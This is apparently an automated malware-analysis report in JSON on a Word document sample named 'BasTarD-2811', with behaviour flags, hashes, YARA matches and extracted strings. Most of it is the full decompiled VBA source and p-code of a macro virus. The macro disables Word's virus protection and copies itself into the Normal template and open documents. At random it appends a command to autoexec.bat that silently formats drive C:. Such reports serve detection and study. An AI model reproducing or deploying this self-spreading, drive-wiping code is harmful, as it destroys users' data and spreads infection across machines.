{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Binary": "May read or write a binary file",
            "Chr": "May attempt to obfuscate specific str",
            "CodeModule": "May attempt to modify the VBA code",
            "Document_Close": "Runs when the Word document is closed",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "Open": "May open a file",
            "Output": "May write to a file",
            "Print #": "May write to a file",
            "Put": "May write to a file",
            "VBA Stomping": "VBA Stomping was detected: the VBA source code and P-code are different, this may have been used to hide malicious code",
            "VBComponents": "May attempt to modify the VBA code",
            "VBProject": "May attempt to modify the VBA code",
            "Write": "May write to a file",
            "autoexec": "Runs when the Word document is opened",
            "vbNormal": "May run an executable file or a system command"
        },
        "macro": "Private Sub Document_Close()\nOn Error Resume Next\nsavename = ActiveDocument.Saved\nWith Options\n     .ConfirmConversions = False\n     .VirusProtection = 0\n     .SaveNormalPrompt = 0\n End With\n Application.EnableCancelKey = Not -1\nIf Dir(\"c:\\winsys.log\", 6) = \"\" Then\nOpen \"c:\\winsys.log\" For Output As #1\nFor i = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines\nbuff = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)\nPrint #1, buff\nNext i\nClose #1\nSetAttr \"c:\\winsys.log\", 6\nEnd If\n daynum = Format(Date, \"dd\")\n monthnum = Format(Date, \"mm\")\n yearnum = Format(Date, \"yyyy\")\n reg = monthnum Mod 2\n Randomize\n Death = Int((10 * Rnd) + 1)\n If yearnum >= 2001 And Death = 5 Then\n    If Dir(\"c:\\autoexec.bat\") <> \"\" Then\n    cr = Chr(13) + Chr(10)\ntxt$ = \" @echo ##############################################################################\" + cr + \"@echo ####         ##  #####  ##        ######      ####        ##  #####  #########\" + cr + \"@echo ####  #####  ##  ####   ########  #####  ###  ####  ########  #####  #########\" + cr + \"@echo ####  #####  ##  ### #  #######  #####  ####  ####  ########  #####  #########\" + cr + \"@echo ####  #####  ##  ## ##  #####   ######  ####  ####     #####  #####  #########\" + cr + \"@echo ####  #####  ##  # ###  #######  #####  ####  ####  ########  #####  #########\" + cr + \"@echo ####  #####  ##   ####  ########  ##            ##  ########  #####  #########\" + cr + \"@echo ####  #####  ##  #####  ##        ##  ########  ##        ##           #######\" + cr + \"@echo #####################################################################  #######\" + cr + \"@echo ##############################################################################\" + cr\n     SetAttr \"c:\\autoexec.bat\", vbNormal\n     str1$ = \"@echo y|format c:/q/u >nul\" + Chr(13) + Chr(10)\n     Open \"c:\\autoexec.bat\" For Binary Access Read Write As #1\n     FileLength = LOF(1)\n     str_ = Input(FileLength, #1)\n     MyPos = InStr(1, str_, \"path\", 1)\n     MyPos = InStr(MyPos, str_, Chr(13), 1)\n     Put #1, MyPos + 2, txt$\n     Put #1, , str1$\n     Close #1\n End If\n End If\nWith NormalTemplate.VBProject.VBComponents.Item(1).CodeModule\n    num = .CountOfLines\n    .DeleteLines 1, num\n    .AddFromFile \"c:\\winsys.log\"\nEnd With\nWith ActiveDocument.VBProject.VBComponents.Item(1).CodeModule\n    num = .CountOfLines\n    .DeleteLines 1, num\n    .AddFromFile \"c:\\winsys.log\"\nEnd With\nWith Dialogs(wdDialogFileSummaryInfo)\n    .Title = \"BasTarD-2811\"\n    .Author = \"$$$$$$\"\n    .Keywordsavename = \"BasTarD-2811\"\n    .Execute\nEnd With\nIf Left(ActiveDocument.Name, 8) <> \"Document\" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName\nIf ActiveDocument.Saved <> s Then ActiveDocument.Saved = s\nEnd Sub\n\n\n' Processing file: VirusShare_200eb4bd9cda81d2b0841f810539c2bd\n' ===============================================================================\n' Module streams:\n' Macros/VBA/ThisDocument - 5125 bytes\n' Line #0:\n' \tFuncDefn (Private Sub Document_Close())\n' Line #1:\n' \tOnError (Resume Next) \n' Line #2:\n' \tLd ActiveDocument \n' \tMemLd Saved \n' \tSt savename \n' Line #3:\n' \tStartWithExpr \n' \tLd Options \n' \tWith \n' Line #4:\n' \tLitVarSpecial (False)\n' \tMemStWith ConfirmConversions \n' Line #5:\n' \tLitDI2 0x0000 \n' \tMemStWith VirusProtection \n' Line #6:\n' \tLitDI2 0x0000 \n' \tMemStWith SaveNormalPrompt \n' Line #7:\n' \tEndWith \n' Line #8:\n' \tLitDI2 0x0001 \n' \tUMi \n' \tNot \n' \tLd Application \n' \tMemSt EnableCancelKey \n' Line #9:\n' \tLitStr 0x000D \"c:\\winsys.log\"\n' \tLitDI2 0x0006 \n' \tArgsLd Dir 0x0002 \n' \tLitStr 0x0000 \"\"\n' \tEq \n' \tIfBlock \n' Line #10:\n' \tLitStr 0x000D \"c:\\winsys.log\"\n' \tLitDI2 0x0001 \n' \tSharp \n' \tLitDefault \n' \tOpen (For Output)\n' Line #11:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLitDI2 0x0001 \n' \tLd MacroContainer \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tMemLd CodeModule \n' \tMemLd CountOfLines \n' \tFor \n' Line #12:\n' \tLd i \n' \tLitDI2 0x0001 \n' \tLitDI2 0x0001 \n' \tLd MacroContainer \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tMemLd CodeModule \n' \tArgsMemLd Lines 0x0002 \n' \tSt buff \n' Line #13:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLd buff \n' \tPrintItemNL \n' Line #14:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tNextVar \n' Line #15:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tClose 0x0001 \n' Line #16:\n' \tLitStr 0x000D \"c:\\winsys.log\"\n' \tLitDI2 0x0006 \n' \tArgsCall SetAttr 0x0002 \n' Line #17:\n' \tEndIfBlock \n' Line #18:\n' \tLd Date \n' \tLitStr 0x0002 \"dd\"\n' \tArgsLd Format$ 0x0002 \n' \tSt daynum \n' Line #19:\n' \tLd Date \n' \tLitStr 0x0002 \"mm\"\n' \tArgsLd Format$ 0x0002 \n' \tSt monthnum \n' Line #20:\n' \tLd Date \n' \tLitStr 0x0004 \"yyyy\"\n' \tArgsLd Format$ 0x0002 \n' \tSt yearnum \n' Line #21:\n' \tLd monthnum \n' \tLitDI2 0x0002 \n' \tMod \n' \tSt reg \n' Line #22:\n' \tArgsCall Read 0x0000 \n' Line #23:\n' \tLitDI2 0x000A \n' \tLd Rnd \n' \tMul \n' \tParen \n' \tLitDI2 0x0001 \n' \tAdd \n' \tFnInt \n' \tSt Death \n' Line #24:\n' \tLd yearnum \n' \tLitDI2 0x07D1 \n' \tGe \n' \tLd Death \n' \tLitDI2 0x0005 \n' \tEq \n' \tAnd \n' \tIfBlock \n' Line #25:\n' \tLitStr 0x000F \"c:\\autoexec.bat\"\n' \tArgsLd Dir 0x0001 \n' \tLitStr 0x0000 \"\"\n' \tNe \n' \tIfBlock \n' Line #26:\n' \tLitDI2 0x000D \n' \tArgsLd Chr 0x0001 \n' \tLitDI2 0x000A \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tSt cr \n' Line #27:\n' \tLitStr 0x0055 \" @echo ##############################################################################\"\n' \tLd cr \n' \tAdd \n' \tLitStr 0x0054 \"@echo ####         ##  #####  ##        ######      ####        ##  #####  #########\"\n' \tAdd \n' \tLd cr \n' \tAdd \n' \tLitStr 0x0054 \"@echo ####  #####  ##  ####   ########  #####  ###  ####  ########  #####  #########\"\n' \tAdd \n' \tLd cr \n' \tAdd \n' \tLitStr 0x0054 \"@echo ####  #####  ##  ### #  #######  #####  ####  ####  ########  #####  #########\"\n' \tAdd \n' \tLd cr \n' \tAdd \n' \tLitStr 0x0054 \"@echo ####  #####  ##  ## ##  #####   ######  ####  ####     #####  #####  #########\"\n' \tAdd \n' \tLd cr \n' \tAdd \n' \tLitStr 0x0054 \"@echo ####  #####  ##  # ###  #######  #####  ####  ####  ########  #####  #########\"\n' \tAdd \n' \tLd cr \n' \tAdd \n' \tLitStr 0x0054 \"@echo ####  #####  ##   ####  ########  ##            ##  ########  #####  #########\"\n' \tAdd \n' \tLd cr \n' \tAdd \n' \tLitStr 0x0054 \"@echo ####  #####  ##  #####  ##        ##  ########  ##        ##           #######\"\n' \tAdd \n' \tLd cr \n' \tAdd \n' \tLitStr 0x0054 \"@echo #####################################################################  #######\"\n' \tAdd \n' \tLd cr \n' \tAdd \n' \tLitStr 0x0054 \"@echo ##############################################################################\"\n' \tAdd \n' \tLd cr \n' \tAdd \n' \tSt txt$ \n' Line #28:\n' \tLitStr 0x000F \"c:\\autoexec.bat\"\n' \tLd vbNormal \n' \tArgsCall SetAttr 0x0002 \n' Line #29:\n' \tLitStr 0x001A \"@echo y|format c:/q/u >nul\"\n' \tLitDI2 0x000D \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLitDI2 0x000A \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tSt str1$ \n' Line #30:\n' \tLitStr 0x000F \"c:\\autoexec.bat\"\n' \tLitDI2 0x0001 \n' \tSharp \n' \tLitDefault \n' \tOpen (For Binary Access Read Write)\n' Line #31:\n' \tLitDI2 0x0001 \n' \tArgsLd LOF 0x0001 \n' \tSt FileLength \n' Line #32:\n' \tLd FileLength \n' \tLitDI2 0x0001 \n' \tSharp \n' \tArgsLd Input$ 0x0002 \n' \tSt str_ \n' Line #33:\n' \tLitDI2 0x0001 \n' \tLd str_ \n' \tLitStr 0x0004 \"path\"\n' \tLitDI2 0x0001 \n' \tFnInStr4 \n' \tSt MyPos \n' Line #34:\n' \tLd MyPos \n' \tLd str_ \n' \tLitDI2 0x000D \n' \tArgsLd Chr 0x0001 \n' \tLitDI2 0x0001 \n' \tFnInStr4 \n' \tSt MyPos \n' Line #35:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tLd MyPos \n' \tLitDI2 0x0002 \n' \tAdd \n' \tLd txt$ \n' \tPutRec \n' Line #36:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tLitDefault \n' \tLd str1$ \n' \tPutRec \n' Line #37:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tClose 0x0001 \n' Line #38:\n' \tEndIfBlock \n' Line #39:\n' \tEndIfBlock \n' Line #40:\n' \tStartWithExpr \n' \tLitDI2 0x0001 \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tMemLd CodeModule \n' \tWith \n' Line #41:\n' \tMemLdWith CountOfLines \n' \tSt num \n' Line #42:\n' \tLitDI2 0x0001 \n' \tLd num \n' \tArgsMemCallWith DeleteLines 0x0002 \n' Line #43:\n' \tLitStr 0x000D \"c:\\winsys.log\"\n' \tArgsMemCallWith AddFromFile 0x0001 \n' Line #44:\n' \tEndWith \n' Line #45:\n' \tStartWithExpr \n' \tLitDI2 0x0001 \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tMemLd CodeModule \n' \tWith \n' Line #46:\n' \tMemLdWith CountOfLines \n' \tSt num \n' Line #47:\n' \tLitDI2 0x0001 \n' \tLd num \n' \tArgsMemCallWith DeleteLines 0x0002 \n' Line #48:\n' \tLitStr 0x000D \"c:\\winsys.log\"\n' \tArgsMemCallWith AddFromFile 0x0001 \n' Line #49:\n' \tEndWith \n' Line #50:\n' \tStartWithExpr \n' \tLd wdDialogFileSummaryInfo \n' \tArgsLd Dialogs 0x0001 \n' \tWith \n' Line #51:\n' \tLitStr 0x000C \"BasTarD-2811\"\n' \tMemStWith Title \n' Line #52:\n' \tLitStr 0x0006 \"$$$$$$\"\n' \tMemStWith Author \n' Line #53:\n' \tLitStr 0x000C \"BasTarD-2811\"\n' \tMemStWith Keywordsavename \n' Line #54:\n' \tArgsMemCallWith Execute 0x0000 \n' Line #55:\n' \tEndWith \n' Line #56:\n' \tLd ActiveDocument \n' \tMemLd New \n' \tLitDI2 0x0008 \n' \tArgsLd LBound 0x0002 \n' \tLitStr 0x0008 \"Document\"\n' \tNe \n' \tIf \n' \tBoSImplicit \n' \tLd ActiveDocument \n' \tMemLd FullName \n' \tParamNamed FileName \n' \tLd ActiveDocument \n' \tArgsMemCall SaveAs 0x0001 \n' \tEndIf \n' Line #57:\n' \tLd ActiveDocument \n' \tMemLd Saved \n' \tLd s \n' \tNe \n' \tIf \n' \tBoSImplicit \n' \tLd s \n' \tLd ActiveDocument \n' \tMemSt Saved \n' \tEndIf \n' Line #58:\n' \tEndSub \n' Line #59:\n"
    },
    "filename": "VirusShare_200eb4bd9cda81d2b0841f810539c2bd",
    "filesize": 30720,
    "filetype": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 5.0, Code page: 1250, Title: BasTarD-2811, Author: $$$$$$, Template: Normal.dot, Last Saved By: Total Konfuzion, Revision Number: 3, Name of Creating Application: Microsoft Word 8.0, Create Time/Date: Fri Dec  8 11:17:00 2000, Last Saved Time/Date: Fri Dec  8 11:17:00 2000, Number of Pages: 1, Number of Words: 0, Number of Characters: 0, Security: 0",
    "hashes": {
        "md5": "200eb4bd9cda81d2b0841f810539c2bd",
        "sha1": "35b3d942c0ea34d1f2a74087c8d24d0377e2e2ac",
        "sha256": "0ab266f941265729ef9973de23672cae6dfe898afaee689a43d240d8dd946afe"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "bjbj",
            ". A!",
            "BasTarD-2811",
            "$$$$$$",
            "Normal.dot",
            "Total Konfuzion",
            "Microsoft Word 8.0",
            "GRISOFT",
            "BasTarD-2811",
            "Title",
            "_PID_GUID",
            "Project",
            "rstd",
            "ole>",
            "\\G{00020430-",
            "0046}#",
            "2.0#0#F:",
            "\\WINNT\\S",
            "ystem32\\",
            "c2.tlb#O",
            "LE Autom`ation",
            "mMSForms",
            "ED49C4C-",
            "7D85-405",
            "A-8DA6-B",
            "D5B4D668",
            "3.TW",
            "D#MicrosPoft ",
            " Libr8ary",
            "PF26",
            "C7BC8-D5",
            "40-4D4F-",
            "B9CA-F93",
            "90C2EAFA",
            "PDOCUME",
            "~1\\pavel\\LOCALS",
            "Temp\\VBE",
            "\\,EX,.E",
            "C|N@YalC|NXa|",
            " /\t0C",
            "Of(ficDO@f",
            "G{2DF8D0",
            "j5BFA-10$1BhE5@AA@4DE52A",
            "gram FilXes\\f",
            "SO97.DLLCHo",
            " 8.0o",
            "BThisDoc@ument",
            "h@6sD",
            "c:\\winsys.log",
            "c:\\winsys.log",
            "c:\\winsys.log",
            "yyyy$",
            "c:\\autoexec.bat",
            "`False",
            " @echo ##############################################################################",
            "@echo ####         ##  #####  ##        ######      ####        ##  #####  #########",
            "@echo ####  #####  ##  ####   ########  #####  ###  ####  ########  #####  #########",
            "@echo ####  #####  ##  ### #  #######  #####  ####  ####  ########  #####  #########",
            "@echo ####  #####  ##  ## ##  #####   ######  ####  ####     #####  #####  #########",
            "@echo ####  #####  ##  # ###  #######  #####  ####  ####  ########  #####  #########",
            "@echo ####  #####  ##   ####  ########  ##            ##  ########  #####  #########",
            "@echo ####  #####  ##  #####  ##        ##  ########  ##        ##           #######",
            "@echo #####################################################################  #######",
            "@echo ##############################################################################",
            "c:\\autoexec.bat",
            "@echo y|format c:/q/u >nul",
            "c:\\autoexec.bat",
            "path",
            " .Tit ",
            "c:\\winsys.log",
            "c:\\winsys.log",
            "BasTarD-28119",
            "$$$$$$9",
            "BasTarD-28119",
            "Document",
            "Attribut",
            "e VB_Nam",
            "e = \"Thi",
            "sDocumen",
            "1Normal",
            "VCreata",
            "`False",
            "Predecl",
            "xTru",
            "\"Expose",
            "Template Deriv",
            "$Customiz",
            "8 Sub ",
            "t_Cl",
            "On Erro r Res",
            "savenAct",
            "th Optio ns",
            ".C@onfirm",
            "vxers",
            "irusProte",
            "Applica",
            "9.En",
            "CancelKe",
            "Not -1",
            "If Dir",
            "(\"c:\\win",
            "sys.log\"",
            ", 6)",
            "Then@=pen",
            " F@AOut",
            "put As #",
            "1 To@ Macro",
            "ainer.VB",
            "Comp",
            "on@s.Ite",
            "m(1)",
            "CdeM odule",
            "un0tOfL",
            "(i,L 1@ovnt*,",
            "Ao i",
            "w0Set",
            "WIfVd`aynum@%",
            "at(D, \"",
            " mon$th",
            "ye4ar",
            "reNg",
            "E 2@",
            "RandA D@",
            "\tInt((1",
            "0 * Rnd)4 +B9 ",
            ">= 2001 A",
            "oexec.bat\") <> ?\t!",
            "Chr(,13",
            "\" @ecpho #",
            "#*#\"",
            "#?##",
            "vbC\u02d4",
            "str1#\">38y|f}t ",
            "c:/q/u >nul",
            "AnOc",
            "cBinary Access urakri",
            "FileLeng",
            "t`= LOFb\t_GIn0h(g",
            "MyPos2",
            "StK, ",
            "_Zpath`nAaB",
            "P o#",
            "1, C",
            "+ 2, QPT\t",
            "'f vd",
            "ur?rr",
            ".Deletebp 0",
            ".AddFromq",
            "nn\t\\?|||\t}\t, ",
            "\tDiaa@s(wd",
            "umm%Info .Tit\"p",
            "TarD-28110",
            "Auth",
            "\u0412word",
            "  .Eps",
            "uLeft(",
            ", 8uesp00",
            "Full",
            "r1|s~",
            ")0:\t",
            "b3a30c32d",
            "WordS1 ",
            "VBA ",
            "Win16",
            "Win32",
            "Mac ",
            "doc3a ",
            "stdole` ",
            "MSFormsC",
            "ThisDocument< ",
            "_Evaluate",
            "Normal ",
            "Office",
            "Project- ",
            "Document_Close7\\ ",
            "Documentj ",
            "savenameH ",
            "ActiveDocument\\ ",
            "Savedd ",
            "Options ",
            "ConfirmConversions",
            "VirusProtectionoD ",
            "SaveNormalPrompt\u02bc ",
            "Application* ",
            "EnableCancelKey ",
            "MacroContainer> ",
            "VBProjectOh ",
            "VBComponents",
            "Itemz ",
            "CodeModule",
            "CountOfLines!\\ ",
            "buff~",
            "Lines ",
            "SetAttrC ",
            "daynum",
            "monthnum",
            "yearnumi\" ",
            "Deathq ",
            "RndR ",
            "cr\\ ",
            "ChrK~ ",
            "txt ",
            "vbNormal- ",
            "str1F5 ",
            "FileLengthw ",
            "LOFc ",
            "str_t5 ",
            "MyPos ",
            "NormalTemplateq ",
            "num ",
            "DeleteLines",
            "AddFromFileu ",
            "Dialogs ",
            "wdDialogFileSummaryInfoE ",
            "Title~ ",
            "Author ",
            "Keywordsavename ",
            "ExecuteY ",
            "SaveAsf; ",
            "FileNamej ",
            "FullName\u041e ",
            "ID=\"{33CF0B4B-7953-4D44-A744-2F454261FD7B}\"",
            "Document=ThisDocument/&H00000000",
            "Name=\"Project\"",
            "HelpContextID=\"0\"",
            "CMG=\"2426E89628FE2CFE2CFE2CFE2C\"",
            "DPB=\"888A445745574557\"",
            "GC=\"ECEE20DEE043E143E1BC\"",
            "[Host Extender Info]",
            "&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000",
            "[Workspace]",
            "ThisDocument=0, 0, 0, 0, C",
            "ThisDocument",
            "dokument Microsoft Word",
            "MSWordDoc",
            "Word.Document.8"
        ],
        "file": {
            "c:\\winsys.log": "Log"
        },
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.301925",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "office_document_vba"
        },
        {
            "Maldoc_VBA_macro_code.yar": "Contains_VBA_macro_code"
        }
    ]
}
